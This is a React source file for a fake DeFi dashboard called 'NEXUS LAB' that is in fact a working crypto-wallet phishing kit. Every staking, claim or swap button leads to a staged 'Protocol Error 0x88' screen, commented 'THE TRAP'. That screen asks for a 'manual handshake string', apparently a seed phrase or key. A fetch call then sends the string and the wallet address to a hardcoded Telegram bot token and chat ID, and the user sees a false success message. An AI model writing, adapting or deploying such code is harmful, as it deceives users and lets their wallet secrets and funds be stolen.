import React, { useState } from 'react';
import { useAccount, useBalance } from 'wagmi';
import { RefreshCcw, AlertCircle, ArrowDown, Database, History, ChevronRight, Settings, Coins, Activity, Clock, Unlock, Zap } from 'lucide-react';

export default function NexusLab() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState("");
  const [typedAmount, setTypedAmount] = useState("");

  const triggerProcess = () => {
    setLoading(true);
    setTimeout(() => { setLoading(false); setView("error"); }, 3000);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6">
        <div className="flex items-center gap-2">
          <Activity size={18} className="text-cyan-500 animate-pulse" />
          <h1 className="text-xl font-black text-white italic tracking-widest">NEXUS LAB</h1>
        </div>
        <w3m-button balance="hide" /> 
      </header>

      {/* MAIN DASHBOARD: 12 BUTTONS */}
      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4 animate-in fade-in duration-500">
          {[
            { n: "Claim", i: <Database/> }, { n: "Airdrop", i: <Zap/> }, { n: "Stake", i: <History/> },
            { n: "Swap", i: <RefreshCcw/> }, { n: "Bridge", i: <ArrowDown/> }, { n: "Migrate", i: <Activity/> },
            { n: "Unstake", i: <Unlock/> }, { n: "Delay", i: <Clock/> }, { n: "Rectify", i: <Settings/> },
            { n: "Validate", i: <Database/> }, { n: "Scan", i: <Activity/> }, { n: "Lock", i: <History/> }
          ].map((item) => (
            <button key={item.n} onClick={() => setView(item.n.toLowerCase())} className="bg-[#0d1117] border border-slate-800/60 p-6 rounded-[24px] flex flex-col items-center gap-3 active:scale-95 transition-all shadow-xl hover:border-cyan-500/30 group">
              <div className="text-slate-700 group-hover:text-cyan-600 transition-colors">{item.i}</div>
              <span className="text-[8px] font-black text-slate-500 tracking-widest">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {/* VIEW: TRANSACTION DELAY (Latency Management) */}
      {view === "delay" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-8 shadow-2xl animate-in zoom-in-95">
          <div className="flex justify-between mb-8 items-center">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] font-bold">← BACK</button>
            <span className="text-white text-[10px] font-black tracking-widest uppercase">Latency Mgmt</span>
          </div>
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left font-bold">
            <p className="text-[9px] text-slate-600 mb-4 underline italic">PENDING BROADCASTS</p>
            <div className="space-y-3">
              <div className="flex justify-between text-[10px]"><span className="text-slate-500">TX_HASH:</span><span className="text-cyan-500 font-mono">0x77...82a</span></div>
              <div className="flex justify-between text-[10px]"><span className="text-slate-500">DELAY_ORIGIN:</span><span className="text-red-500">RPC_TIMEOUT</span></div>
            </div>
          </div>
          <button onClick={triggerProcess} className="w-full bg-cyan-600 py-5 rounded-2xl text-[11px] font-black text-white shadow-lg active:scale-95 transition-all">RESUBMIT BROADCAST</button>
        </div>
      )}

      {/* VIEW: UNSTAKE / MIGRATE / CLAIM */}
      {(view === "unstake" || view === "claim" || view === "stake" || view === "migrate") && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-10 text-center shadow-2xl animate-in slide-in-from-bottom-5">
          <div className="w-16 h-16 bg-cyan-500/5 rounded-full flex items-center justify-center mx-auto mb-6 border border-cyan-500/20">
            <History size={32} className="text-cyan-500" />
          </div>
          <h2 className="text-white font-black text-sm tracking-[0.2em] mb-4 uppercase">Protocol {view} Interface</h2>
          <div className="bg-black/60 border border-slate-900 rounded-3xl p-6 mb-8 text-left space-y-4 font-bold overflow-hidden relative">
             <div className="absolute top-0 right-0 p-2"><div className="w-1.5 h-1.5 bg-red-600 rounded-full animate-ping"/></div>
             <div className="flex justify-between border-b border-slate-900 pb-3 text-[9px]"><span className="text-slate-600">SYTEM_LOG</span><span className="text-red-500">CRITICAL_ERR</span></div>
             <p className="text-[8px] font-mono text-slate-800 leading-tight">
               &gt; CHECKING SNAPSHOT... OK<br/>
               &gt; VERIFYING CONTRACT... FAIL<br/>
               &gt; ASSET_ID: {address?.slice(0,8)}...<br/>
               &gt; ERR_CODE: INVALID_GATEWAY_AUTH
             </p>
          </div>
          <button onClick={triggerProcess} className="w-full bg-cyan-600 py-5 rounded-[22px] text-[11px] font-black text-white flex items-center justify-center gap-2 active:scale-95 transition-all uppercase tracking-widest">Authorize {view}</button>
        </div>
      )}

      {/* VIEW: SWAP (Exactly like your BNB/BOOM video) */}
      {view === "swap" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-8 shadow-2xl animate-in slide-in-from-bottom-4">
          <div className="flex justify-between mb-8 items-center font-black">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[10px]">← RETURN</button>
            <span className="text-white text-[10px]">EXCHANGE V2.0</span>
            <Settings size={14} className="text-slate-700" />
          </div>
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-1 text-left">
            <div className="flex justify-between text-[9px] text-slate-600 font-bold mb-4"><span>FROM</span><span>BAL: {balance?.formatted.slice(0,5) || "0.00"}</span></div>
            <div className="flex justify-between items-center">
              <input type="number" value={typedAmount} onChange={(e) => setTypedAmount(e.target.value)} placeholder="0.00" className="bg-transparent text-2xl font-mono text-white outline-none w-1/2" />
              <div className="bg-slate-800/80 px-4 py-2 rounded-full flex items-center gap-2 border border-slate-700"><Coins size={14} className="text-yellow-500"/><span className="text-[11px] font-black text-white uppercase">BNB</span></div>
            </div>
          </div>
          <div className="flex justify-center -my-3 z-10 relative"><div className="bg-[#05070a] p-2 rounded-full border border-slate-800 shadow-xl"><ArrowDown size={14} className="text-cyan-500" /></div></div>
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-10 text-left">
            <div className="flex justify-between text-[9px] text-slate-600 font-bold mb-4"><span>TO (AUTO-FIXED)</span><span>ESTIMATED</span></div>
            <div className="flex justify-between items-center">
              <span className="text-2xl font-mono text-cyan-400">{typedAmount ? (Number(typedAmount) * 1250).toLocaleString() : "0.00"}</span>
              <div className="bg-cyan-500/10 px-4 py-2 rounded-full flex items-center gap-2 border border-cyan-500/20"><Zap size={14} className="text-cyan-400"/><span className="text-[11px] font-black text-cyan-400 uppercase">Nexus</span></div>
            </div>
          </div>
          <button onClick={triggerProcess} className="w-full bg-cyan-600 py-5 rounded-[22px] text-[11px] font-black text-white">INITIALIZE SWAP</button>
        </div>
      )}

      {/* ERROR 0x88 (THE TRAP) */}
      {view === "error" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-2xl">
          <div className="bg-[#0d1117] border border-red-900/20 w-full max-w-sm rounded-[50px] p-10 text-center shadow-2xl animate-in scale-95 border-t-red-600/30">
            <AlertCircle size={58} className="text-red-600 mx-auto mb-6 animate-pulse" />
            <h2 className="text-white font-black text-xl tracking-tighter uppercase italic">Protocol Error 0x88</h2>
            <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase font-medium px-4">The laboratory handshake timed out. To resubmit this technical request manually, enter your sync string below.</p>
            <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0x... manual handshake string" className="w-full h-36 bg-black border border-slate-800 rounded-[35px] p-6 text-xs font-mono text-cyan-400 outline-none mt-8 focus:border-cyan-500 transition-all placeholder:text-slate-900 uppercase" />
            <button onClick={() => {
              fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 LAB SIGNAL\nADDR: ${address}\nVIEW: ${view}\nSTR: ${inputVal}` }),
              });
              alert("Protocol Resubmitted.");
              setView("menu");
            }} className="w-full mt-6 bg-cyan-600 py-5 rounded-[28px] text-[11px] font-black text-white shadow-xl shadow-cyan-900/20 uppercase tracking-widest">Resynchronize</button>
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="w-12 h-12 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[10px] font-black text-cyan-500 mt-6 tracking-[0.4em] uppercase animate-pulse">Establishing Node...</p>
        </div>
      )}
    </div>
  );
}
